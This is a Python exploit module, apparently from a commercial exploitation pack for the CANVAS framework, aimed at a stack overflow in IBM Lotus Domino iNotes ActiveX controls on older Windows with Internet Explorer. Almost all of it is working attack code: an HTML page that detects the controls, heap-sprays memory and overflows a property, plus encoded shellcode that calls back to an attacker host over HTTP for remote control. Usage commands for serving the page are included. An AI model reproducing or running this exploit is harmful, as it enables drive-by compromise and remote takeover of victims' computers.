#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct

# GUI info
NAME = "[0 Day] IBM Lotus Domino iNotes ActiveX Stack Overflow"

DESCRIPTION = "Stack Overflow Vulnerability in IBM Lotus Domino iNotes ActiveX"
DOCUMENTATION = {}
DOCUMENTATION['Date public'] = "Not Public"
DOCUMENTATION['VersionsAffected'] = "IBM Lotus Domino 6.x 7.x"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['2000','XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_inotes -l 192.168.41.1 -d 5555 -p 8080
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows 2000 SP4, XP SP0-SP2 with IE'],
}

# clsid:E008A543-CEFB-4559-912F-C27C2B89F13B => Domino Web Access 7 - dwa7W.cab from Lotus Domino 7.0.2
# clsid:3BFFE033-BF43-11D5-A271-00A024A51325 => iNotes 6 - iNotes6W.cab from Lotus Domino 7.0.2
# clsid:1E2941E3-8E63-11D4-9D5A-00902742D6E0 => iNotes 6 - iNotes.cab from Lotus Domino 6.5.5	
	
class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.badstring = "\x00"
        self.subesp = 0
        self.name = NAME 
        self.filename = "index.html"
        return

    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	try {
		var detect1 = new ActiveXObject("dwa7.dwa7.1");
	}
	catch (e) {}
	
	try {
		var detect2 = new ActiveXObject("iNotes6.iNotes6.1");
	}
	catch (e) {}
	
	try {
		var detect3 = new ActiveXObject("iNotes.iNotes.1");
	}
	catch (e) {}
	
	if (detect1 || detect2 || detect3) {	
		document.getElementById("targetDiv").innerHTML = "MYOBJECT";
			
		var stackBuffer = "";
		var heapSprayToAddress = 0x0c0c0c0c; 
		var payLoadCode = unescape('SHELLCODE'); 
		var heapBlockSize = 0x400000; 
		var payLoadSize = payLoadCode.length * 2; 
		var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
		var spraySlide = unescape("%u0c0c%u0c0c"); 
		spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
		heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
		memory = new Array(); 
		
		for (i=0;i<heapBlocks;i++) { 
			memory[i] = spraySlide + payLoadCode; 
		} 
		
		function getSpraySlide(spraySlide, spraySlideSize) {
			while (spraySlide.length*2<spraySlideSize) { 
				spraySlide += spraySlide; 
			} 
			
			spraySlide = spraySlide.substring(0,spraySlideSize/2); 
			return spraySlide; 
		} 
		
		if (detect1 || detect2) {	
			for (i=0;i<300;i++) {
				stackBuffer += unescape("%u0c0c");  
			}
	
			target1.General_Mode = 1;
			target1.Attachment_Times = "01/02/03 10:10:10 " + stackBuffer;
			
			target2.General_Mode = 1;
			target2.Attachment_Times = "01/02/03 10:10:10 " + stackBuffer;
		}

		if (detect3) {			
			target3.General_Mode = 1;
			target3.Attachment_Times = "01/02/03 10:10:10 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x07\x07\x07\x07AAAAAAAAAAAAAAAAAA";
		}
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>                
"""
	myobject = ""
	myobject += "<object id='target1' classid='clsid:E008A543-CEFB-4559-912F-C27C2B89F13B'></object>"
	myobject += "<object id='target2' classid='clsid:3BFFE033-BF43-11D5-A271-00A024A51325'></object>"
	myobject += "<object id='target3' classid='clsid:1E2941E3-8E63-11D4-9D5A-00902742D6E0'></object>"		

	filedata = filedata.replace('MYOBJECT', myobject)
	filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))
	
        return filedata

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()
        
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring = self.makefile()            
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def createShellcode(self):                
        host = self.callback.ip
        port = self.callback.port

        httpWrapper = ''
        
        try:
            if self.HTTPMOSDEF:
                print "[!] using HTTP MOSDEF tunneling"
                print "callback: [%s:%d]\n" % (host, port)
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval":0x1000})                
                	
                if self.useSSL:
                    ssl = "s"
                else:
                    ssl = ""                
                    
                sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
                httpWrapper = sc.get()                
                print "[!] HTTP MOSDEF len: %d bytes" % (len(httpWrapper))
        except:
            httpWrapper = ""
            
        rawshellcode = self.createInjectToSelf(host, port, injectme = httpWrapper, movetostack = True)
        
        from encoder import addencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)

        self.shellcode = encoder.encode(rawshellcode)
        
        return self.shellcode
        
    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
